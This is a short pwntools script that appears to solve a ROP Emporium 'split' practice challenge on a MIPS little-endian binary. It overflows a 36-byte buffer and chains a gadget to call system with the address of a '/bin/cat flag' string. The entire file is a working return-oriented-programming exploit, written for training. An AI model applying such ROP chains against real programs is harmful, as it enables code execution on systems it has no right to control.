from pwn import *

bin_cat_flag = 0x411010
lw_to_a0 = 0x400a20 # lw a0,8(sp); lw t9,4(sp); jalr t9;

context(arch='mips',endian='little')
elf = ELF("./split_mipsel")

#p = gdb.debug(elf.path,'''
#        break pwnme
#        continue
#''')

p = process(elf.path)
p.recvuntil('> ')

buf = b'A' * 36
buf += p32(lw_to_a0)
buf += p32(0xAAAAAAAA) # dummy
buf += p32(elf.symbols['system'])
buf += p32(bin_cat_flag)

p.send(buf)
p.interactive()
